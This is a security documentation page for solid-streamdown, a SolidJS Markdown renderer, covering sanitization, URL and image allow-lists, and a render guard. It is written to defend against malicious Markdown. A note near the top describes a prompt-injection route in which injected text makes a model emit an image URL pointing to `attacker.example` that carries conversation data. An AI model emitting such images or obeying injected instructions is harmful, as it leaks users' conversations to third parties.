<!-- Ported from vercel/streamdown apps/website/content/docs/security.mdx @ 072ce7e. Copyright 2023 Vercel, Inc. Licensed under the Apache License, Version 2.0. Modified for SolidJS by the solid-streamdown authors. -->

# Security

Built-in content hardening and security features to protect against malicious Markdown.

solid-streamdown is built with security as a top priority. When rendering user-generated or AI-generated Markdown, you need to protect against malicious content, especially content that may have been shaped by prompt injection.

## Why Security Matters

Markdown can contain:

- **Links to malicious sites** - Phishing or malware distribution
- **External images** - Privacy tracking or CSRF attacks
- **HTML content** - XSS vulnerabilities
- **JavaScript execution** - Code injection
- **Prompt injection** - AI models manipulated to include harmful content

solid-streamdown uses three layers of protection:

1. **[rehype-sanitize](https://github.com/rehypejs/rehype-sanitize)** strips dangerous HTML elements and attributes using GitHub's sanitization schema, extended with `tel:` protocol support.
2. **[rehype-harden](https://github.com/vercel-labs/markdown-sanitizers)** restricts URL protocols, link domains, and image sources.
3. **The render guard** in solid-streamdown's renderer drops scripts, event handlers and `javascript:` URLs whatever plugins you configure. See [The render guard](#the-render-guard).

The first two are the plugins in `defaultRehypePlugins` (after `raw`, which parses HTML in the Markdown), as in Streamdown.

## Default Security

By default, solid-streamdown configures `rehype-harden` permissively to allow maximum functionality:

| Option | Default | Effect |
| --- | --- | --- |
| `allowedImagePrefixes` | `["*"]` | All image URLs allowed |
| `allowedLinkPrefixes` | `["*"]` | All link URLs allowed |
| `allowedProtocols` | `["*"]` | Any protocol allowed |
| `defaultOrigin` | `undefined` | No origin restriction |
| `allowDataImages` | `true` | Base64 images allowed by harden |

The `rehype-sanitize` step runs first. Its schema allows `http`, `https`, `irc`, `ircs`, `mailto`, `xmpp` and `tel` for links, and only `http` and `https` for image sources, so with the default plugins `data:` images and custom-protocol links are already removed before `rehype-harden` sees them.

This works well for trusted content but should be tightened for untrusted sources.

> **Note:** **Building an AI chat UI? Restrict image origins.** With the defaults, an image such as `![](https://attacker.example/p?d=...)` is requested by the browser as soon as the message renders, with no user action. If a model's context contains attacker-controlled text (a fetched web page, a tool result, a stored record), prompt injection can make it emit such an image with conversation data in the URL. Set `allowedImagePrefixes` to the origins you trust and `allowDataImages: false`, as shown in [Restricting Images](#restricting-images) and [Protecting Against Prompt Injection](#protecting-against-prompt-injection). Raw `<img>` tags are covered by the same `rehype-harden` setting, so you do not need to disable `rehype-raw` for this.

## How rehype-harden reads its options

When you pass your own options to `harden`, anything you leave out takes `rehype-harden`'s own default, not solid-streamdown's:

- `allowedLinkPrefixes` and `allowedImagePrefixes` default to `[]`, which blocks every `http` and `https` link or image. Pass `["*"]` to keep them.
- `defaultOrigin` is required whenever either prefix list holds anything other than `"*"`; `rehype-harden` throws otherwise.
- `allowedProtocols` defaults to `[]`. It only adds protocols: `http`, `https`, `irc`, `ircs`, `mailto`, `xmpp` and `blob` are always allowed, and `javascript`, `data` (except images with `allowDataImages`), `file` and `vbscript` are always blocked. Entries are matched with their trailing colon, such as `"vscode:"`.

## Restricting Protocols

By default, any protocol that `rehype-sanitize` keeps is allowed. You can limit links to `rehype-harden`'s built-in safe protocols:

<!-- example: examples/vite/src/snippets/security/restrict-protocols.tsx -->
```tsx
import { harden } from "rehype-harden";
import { defaultRehypePlugins, Streamdown } from "solid-streamdown";

const markdown = "[Docs](https://docs.solidjs.com), [mail](mailto:team@example.com), [call](tel:+15550100)";

export default function Page() {
  return (
    <Streamdown
      rehypePlugins={[
        defaultRehypePlugins.raw,
        defaultRehypePlugins.sanitize,
        defaultRehypePlugins.undoubleClobberPrefix,
        [
          harden,
          {
            // Keep every http(s) URL: these lists default to [], which blocks them all.
            allowedLinkPrefixes: ["*"],
            allowedImagePrefixes: ["*"],
            // No protocols beyond harden's built-in safe set, so tel: is blocked.
            allowedProtocols: [],
          },
        ],
      ]}
    >
      {markdown}
    </Streamdown>
  );
}
```

> **Note:** When overriding `rehypePlugins`, always include `defaultRehypePlugins.sanitize` (or your own sanitize step) to preserve XSS protection. The `rehypePlugins` prop **replaces** the entire default array; it does not merge.

> **Note:** Put `defaultRehypePlugins.undoubleClobberPrefix` right after the sanitize step. Sanitizing prefixes every `id` with `user-content-`, so raw HTML ids cannot clobber globals such as `window.details`. This plugin removes the second prefix from footnote ids, which already have one, and points `#` links at the prefixed ids.

This is useful for security-sensitive applications where you want to block schemes such as `tel:` or desktop app protocols. `javascript:` and `data:` links are blocked in every configuration.

### Custom Protocol Schemes

To enable custom protocol schemes like `postman://`, `vscode://`, or `slack://`, allow them in both steps: add them to the sanitize schema's `href` protocols, and to `allowedProtocols` with a trailing colon:

<!-- example: examples/vite/src/snippets/security/custom-protocols.tsx#options -->
```tsx
const CUSTOM_PROTOCOLS = ["postman", "vscode", "slack"];

// rehype-sanitize keeps only the link protocols its schema lists.
const [, baseSchema] = defaultRehypePlugins.sanitize as [unknown, SanitizeSchema];
const schema: SanitizeSchema = {
  ...baseSchema,
  protocols: {
    ...baseSchema.protocols,
    href: [...(baseSchema.protocols?.href ?? []), ...CUSTOM_PROTOCOLS],
  },
};

const AppLinks = () => (
  <Streamdown
    rehypePlugins={[
      defaultRehypePlugins.raw,
      [rehypeSanitize, schema],
      defaultRehypePlugins.undoubleClobberPrefix,
      [
        harden,
        {
          allowedLinkPrefixes: ["*"],
          allowedImagePrefixes: ["*"],
          // rehype-harden compares protocols with their trailing colon.
          allowedProtocols: CUSTOM_PROTOCOLS.map((protocol) => `${protocol}:`),
        },
      ],
    ]}
  >
    {markdown}
  </Streamdown>
);
```

Because this replaces the default sanitize step, the `allowedTags` prop no longer applies; add custom tags to your schema instead.

## Restricting Links

Limit which domains users can link to:

<!-- example: examples/vite/src/snippets/security/restrict-links.tsx -->
```tsx
import { harden } from "rehype-harden";
import { defaultRehypePlugins, Streamdown } from "solid-streamdown";

const markdown = `[Safe link](https://github.com/vercel/streamdown)
[Unsafe link](https://malicious-site.com)`;

export default function Page() {
  return (
    <Streamdown
      rehypePlugins={[
        defaultRehypePlugins.raw,
        defaultRehypePlugins.sanitize,
        defaultRehypePlugins.undoubleClobberPrefix,
        [
          harden,
          {
            defaultOrigin: "https://your-app.com",
            allowedLinkPrefixes: ["https://your-app.com", "https://github.com"],
          },
        ],
      ]}
    >
      {markdown}
    </Streamdown>
  );
}
```

Links that don't match an allowed prefix are replaced with their text and a `[blocked]` marker.

### Example

With the above configuration:

```markdown
[Safe link](https://github.com/vercel/streamdown)
[Unsafe link](https://malicious-site.com)
```

Results in:

- Safe link: Works normally
- Unsafe link: Renders as "Unsafe link [blocked]", without a link

## Restricting Images

Similarly, restrict which domains can serve images:

<!-- example: examples/vite/src/snippets/security/restrict-images.tsx -->
```tsx
import { harden } from "rehype-harden";
import { defaultRehypePlugins, Streamdown } from "solid-streamdown";

const markdown = "Images from origins other than your CDN are not rendered.";

export default function Page() {
  return (
    <Streamdown
      rehypePlugins={[
        defaultRehypePlugins.raw,
        defaultRehypePlugins.sanitize,
        defaultRehypePlugins.undoubleClobberPrefix,
        [
          harden,
          {
            // Required whenever allowedImagePrefixes or allowedLinkPrefixes is not "*"
            defaultOrigin: "https://your-app.com",
            allowedImagePrefixes: ["https://your-cdn.com", "https://trusted-images.com"],
            allowedLinkPrefixes: ["*"],
            allowedProtocols: ["*"],
            allowDataImages: false, // Disable base64 images
          },
        ],
      ]}
    >
      {markdown}
    </Streamdown>
  );
}
```

Images whose URL does not start with one of the allowed prefixes are not rendered, so the browser never requests them. This applies to both Markdown images (`![](...)`) and raw `<img>` tags.

> **Note:** `rehype-harden` throws if `allowedImagePrefixes` or `allowedLinkPrefixes` is set to anything other than `["*"]` without a `defaultOrigin`.

### Data Images

Base64-encoded images (`data:image/...`) can be disabled in `rehype-harden`:

```text
allowDataImages: false
```

This prevents embedding arbitrary image data in Markdown, which could be used for:

- Tracking pixels
- Large embedded files
- Malicious payloads

With the default sanitize schema, `data:` image sources are already removed. The option matters when your sanitize schema allows `data` in `src`, or when you leave sanitize out.

## Protecting Against Prompt Injection

When using AI-generated content, models can be manipulated to include malicious links or content. Here's a production-ready configuration:

<!-- example: examples/vite/src/snippets/security/prompt-injection.tsx -->
```tsx
import { harden } from "rehype-harden";
import { defaultRehypePlugins, Streamdown } from "solid-streamdown";

const strict = {
  defaultOrigin: "https://your-app.com",
  allowedLinkPrefixes: ["https://your-app.com", "https://docs.your-app.com", "https://github.com"],
  allowedImagePrefixes: ["https://your-cdn.com"],
  allowedProtocols: [], // only harden's built-in safe protocols
  allowDataImages: false,
};

// More permissive for content your own users typed
const permissive = {
  allowedLinkPrefixes: ["*"],
  allowedImagePrefixes: ["*"],
  allowedProtocols: ["*"],
};

export function ChatMessage(props: { content: string; isAIGenerated: boolean }) {
  return (
    <Streamdown
      rehypePlugins={[
        defaultRehypePlugins.raw,
        defaultRehypePlugins.sanitize,
        defaultRehypePlugins.undoubleClobberPrefix,
        [harden, props.isAIGenerated ? strict : permissive],
      ]}
    >
      {props.content}
    </Streamdown>
  );
}

export default function Conversation() {
  return (
    <>
      <ChatMessage content="Can you link the docs?" isAIGenerated={false} />
      <ChatMessage content="See [the docs](https://docs.your-app.com/start)." isAIGenerated />
    </>
  );
}
```

## Custom HTML Tags

By default, solid-streamdown's sanitizer strips unknown HTML tags (while preserving their content). If you need to render custom tags like `<ref>` or `<mention>`, use the `allowedTags` prop:

<!-- example: examples/vite/src/snippets/security/custom-tags.tsx -->
```tsx
import { Streamdown } from "solid-streamdown";

const NoteBadge = (props: { noteId?: string }) => (
  <span class="rounded bg-muted px-1 text-sm">note #{props.noteId}</span>
);

const UserMention = (props: { userId?: string }) => (
  <span class="font-medium text-primary">@user-{props.userId}</span>
);

const markdown = 'Ask <mention user_id="42">Ada</mention> about <ref note_id="7">the plan</ref>.';

export default function CustomTags() {
  return (
    <Streamdown
      allowedTags={{
        ref: ["note_id"], // Allow <ref> with note_id attribute
        mention: ["user_id"], // Allow <mention> with user_id attribute
      }}
      components={{
        ref: (props: { note_id?: string }) => <NoteBadge noteId={props.note_id} />,
        mention: (props: { user_id?: string }) => <UserMention userId={props.user_id} />,
      }}
    >
      {markdown}
    </Streamdown>
  );
}
```

Only attributes explicitly listed in `allowedTags` are preserved; all other attributes are stripped for security. A tag name only selects a component through your `components` map (or `fallbackComponent`); otherwise it renders as a plain element. See the [Components documentation](./components.md#custom-html-tags) for more details.

> **Note:** The `allowedTags` prop only works with the default rehype plugins. If you provide custom `rehypePlugins`, you must configure sanitization yourself.

## HTML Content

solid-streamdown supports raw HTML through `rehype-raw`. To disable HTML entirely, leave `raw` out:

<!-- example: examples/vite/src/snippets/security/no-html.tsx -->
```tsx
import { defaultRehypePlugins, Streamdown } from "solid-streamdown";

const markdown = "This <b>tag</b> is shown as text.";

export default function Page() {
  return (
    <Streamdown
      rehypePlugins={[
        // Omit defaultRehypePlugins.raw to disable HTML
        defaultRehypePlugins.sanitize,
        defaultRehypePlugins.undoubleClobberPrefix,
        defaultRehypePlugins.harden,
      ]}
    >
      {markdown}
    </Streamdown>
  );
}
```

Without `rehype-raw`, HTML tags are escaped and displayed as text.

Omitting `rehype-raw` does not restrict Markdown images (`![](...)`). To control where images can load from, configure `allowedImagePrefixes` on `rehype-harden` as described in [Restricting Images](#restricting-images).

## Relative URLs

Control how relative URLs are handled with `rehype-harden`'s `defaultOrigin` option:

```text
defaultOrigin: "https://your-app.com"
```

Relative URLs are resolved against this origin when they are checked against the allowed prefixes:

```markdown
[Relative link](/docs/guide)
```

is checked as `https://your-app.com/docs/guide`. A relative link that passes stays relative (`/docs/guide`) in the output.

## URL Transform

For URL-level control without writing a rehype plugin, use the `urlTransform` prop. This runs on every URL in the rendered Markdown (links, images, etc.) and matches the react-markdown API.

By default, `defaultUrlTransform` is a passthrough: URL security is already handled by `rehype-sanitize`, `rehype-harden` and the render guard. Use `urlTransform` when you need custom URL rewriting beyond what those provide.

<!-- example: examples/vite/src/snippets/security/url-transform.tsx -->
```tsx
import { defaultUrlTransform, Streamdown } from "solid-streamdown";

const markdown = "Links keep their URL; image sources go through the proxy. [Docs](https://docs.solidjs.com)";

export default function ProxiedImages() {
  return (
    <Streamdown
      urlTransform={(url, key, node) => {
        // Proxy images through your CDN
        if (key === "src") {
          return `https://your-cdn.com/proxy?url=${encodeURIComponent(url)}`;
        }
        return defaultUrlTransform(url, key, node);
      }}
    >
      {markdown}
    </Streamdown>
  );
}
```

## Skipping HTML

The `skipHtml` prop removes `raw` HTML nodes that are still in the tree when rendering starts, instead of showing them as text. In solid-streamdown's pipeline, as in Streamdown's, Markdown HTML never gets there: `rehype-raw` parses it, or, when `raw` is left out of `rehypePlugins`, it is turned into text before the rehype step. So `skipHtml` only affects `raw` nodes that a rehype plugin of your own adds. To keep HTML from rendering as elements, leave `raw` out as shown in [HTML Content](#html-content).

## The render guard

React DOM gives Streamdown users a baseline even when they replace `rehypePlugins` and drop sanitize and harden: it never runs `<script>` elements it creates, ignores string `on*` handlers, and (in React 19) blocks `javascript:` URLs. Solid creates real DOM elements, so solid-streamdown enforces the same baseline in its renderer, on every element, on client and server, **whatever `rehypePlugins` you configure**:

- `script` elements are dropped.
- Every attribute whose name starts with `on` is dropped.
- Attribute names that mean something special to Solid are dropped: `innerHTML`, `outerHTML`, `textContent`, `innerText`, `ref`, `classList`, `component`, `children`, `is`, and any name containing `:` (`on:*`, `prop:*`, `attr:*`, `use:*`, `bool:*`, and namespaced attributes such as `xlink:href`).
- `javascript:` and `vbscript:` URLs are removed from URL-valued attributes.
- `style` strings are parsed into objects and applied property by property, never as a raw CSS string.
- `align` on `td` and `th` becomes `text-align` only for `left`, `right`, `center` and `justify`; any other value is dropped.
- Raw-text elements (`iframe`, `noembed`, `noframes`, `noscript`, `style`, `textarea`, `title`, `xmp`) render only their text content.

The guard also covers attributes a highlighter plugin puts on code tokens. With the default plugins, sanitize has already removed most of what the guard drops, so it rarely changes the output. Each difference from Streamdown is listed in [UPSTREAM.md](../../UPSTREAM.md).

### Removing rehype-sanitize

Leave sanitize out only for Markdown you trust, such as content your own team wrote:

<!-- example: examples/vite/src/snippets/security/trusted-html.tsx -->
```tsx
import { defaultRehypePlugins, Streamdown } from "solid-streamdown";

// Only for Markdown you wrote yourself: without sanitize, any HTML element
// and attribute passes, apart from what the render guard drops.
const markdown = "<details><summary>Release notes</summary>Written by our team.</details>";

export default function TrustedHtml() {
  return (
    <Streamdown rehypePlugins={[defaultRehypePlugins.raw, defaultRehypePlugins.harden]}>
      {markdown}
    </Streamdown>
  );
}
```

The render guard is not a sanitizer. Without `rehype-sanitize`, content can still use elements and attributes the guard does not police, such as an `iframe` with `srcdoc`, `object`, `embed`, and SVG `animate` or `set` elements that rewrite attributes after rendering. React 19 lets the same vectors through, so this matches what Streamdown users get when they drop sanitize.

### Components that render raw-text elements

The guard escapes what solid-streamdown renders, not what your components render. A component that puts content into a raw-text element, such as `components={{ code: (props) => <style>{props.children}</style> }}`, is responsible for escaping that content itself.

### Raw HTML inside solid-streamdown

solid-streamdown parses or serializes HTML in exactly three places, the same three as Streamdown:

1. It inserts the SVG that the Mermaid plugin's `render()` returns. The plugin uses Mermaid's `securityLevel: "strict"` unless your `mermaid.config` overrides it.
2. It parses that SVG with `DOMParser`, in an inert document, for SVG and PNG downloads.
3. The table copy control puts the rendered table's `outerHTML` on the clipboard as `text/html`. That serializes DOM that is already sanitized; nothing is inserted into the page.

### Known risks kept for parity

These behave as in Streamdown and will change together with it (see [UPSTREAM.md](../../UPSTREAM.md)):

- CSV export does not escape spreadsheet formulas.
- Links inside Mermaid diagrams skip the [link safety](./link-safety.md) prompt.

## Advanced URL Handling

For advanced URL handling beyond what `urlTransform` and `rehype-harden` provide, you can create a custom rehype plugin. This gives you full control over URL transformation and validation in your Markdown content.

## Differences from Streamdown

- Added the sections on the render guard, removing rehype-sanitize, components that render raw-text elements, the three raw-HTML uses, and the known upstream risks.
- Added "How rehype-harden reads its options", and corrected several statements on Streamdown's page against `rehype-harden` 1.1.8 and the default sanitize schema:
  - Its protocol example passes only `allowedProtocols`, which blocks every `http` and `https` link and image. Ours also passes `["*"]` prefixes, and an empty `allowedProtocols` (its `"http"`-style entries, without a colon, matched nothing).
  - Its custom-protocol example lists protocols without the trailing colon and does not extend the sanitize schema, so the links stay blocked. Ours does both.
  - Blocked links render as text with `[blocked]`; they are not rewritten to `defaultOrigin`. Relative links stay relative.
  - `skipHtml` has no visible effect on Markdown HTML, with or without `rehype-raw`, so the `<Streamdown skipHtml>` example is dropped and the section explains what the prop does.
  - `data:` images are removed by the default sanitize schema, although the harden default allows them.
- The prompt-injection example passes `content` and `isAIGenerated` as Solid props instead of destructuring them, and its strict config uses `allowedProtocols: []`.
- The samples that rebuild `rehypePlugins` keep `undoubleClobberPrefix` after the sanitize step, and a note explains it. Streamdown's samples leave it out, which prefixes footnote ids twice and breaks their links.
- The custom-tags example defines small `NoteBadge` and `UserMention` components and reads `props.note_id` / `props.user_id`.
- The default `rehype-harden` options and the `defaultOrigin` / `allowDataImages` fragments are a table and `text` blocks instead of TypeScript fragments.
